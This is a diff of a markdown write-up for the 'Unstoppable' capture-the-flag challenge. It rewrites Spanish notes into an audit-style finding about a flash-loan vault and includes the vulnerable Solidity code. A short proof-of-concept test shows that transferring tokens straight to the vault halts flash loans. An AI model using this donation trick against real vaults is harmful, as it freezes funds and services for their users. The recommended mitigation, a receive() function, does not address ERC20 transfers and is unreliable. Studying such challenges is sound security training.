@@ -7,18 +7,14 @@ To catch any bugs before going 100% permissionless, the developers decided to ru
 Starting with 10 DVT tokens in balance, show that it's possible to halt the vault. It must stop offering flash loans.
 
 
+### [H-1] Attacker can transfer underlyin tokens to the vault without deposit, making the contract halt
 
-# Imparable
+**Description:**\
+In a point of `UstoppableVaul::flashLoan` function, the shares from the totalSupply (vault's deposited tokens) is compared with the totalAssets() (tokens property of the vault). some user can transfer an amount of the allowed token to de vault, making to this comparision revert the transaction and continuing reverting
 
-Hay una bóveda tokenizada con un millón de tokens DVT depositados. Está ofreciendo préstamos flash de forma gratuita, hasta que termine el período de gracia.
+<details>
+<summary>UstoppableVaul::flashLoan</summary>
 
-Para detectar cualquier error antes de volverse 100% sin permisos, los desarrolladores decidieron ejecutar una beta en vivo en la testnet. Hay un contrato de monitoreo para verificar la disponibilidad de la función de préstamos flash.
-
-Comenzando con un saldo de 10 tokens DVT, demuestra que es posible detener la bóveda. Debe dejar de ofrecer préstamos flash.
-
-# Notes:
-
-in `UstoppableVaul::flashLoan` function:
 ```javascript
 function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
         external
@@ -26,11 +22,9 @@ function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amoun
     {
         if (amount == 0) revert InvalidAmount(0); // fail early
         if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
-        // @e - totalAssets() -> underlyin tokens on the vault
-        // @e - totalSupply -> vault asset token
         uint256 balanceBefore = totalAssets();
-        // @audit-high - attacker can transfer underlyin tokens to the vault making the following allways revert
-        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
+
+ @>     if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
 
         // transfer tokens out + execute callback on receiver
         ERC20(_token).safeTransfer(address(receiver), amount);
@@ -51,6 +45,22 @@ function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amoun
         return true;
     }
 ```
+</details>
 
-The test:
+**Impact:**\
+The voult will be halt permanently
+
+**Proof of Concept:**\
+The following test pass the challenge:
+
 ```javascript
+function test_unstoppable() public checkSolvedByPlayer {
+    token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
+    console.log("Vault assets balance: ", vault.totalAssets());
+    console.log("Vault shares balance: ", vault.convertToShares(vault.totalSupply()));
+}
+```
+**Recommended Mitigation:**\
+Implement a `receive()` function that update the realated balances.
+
+
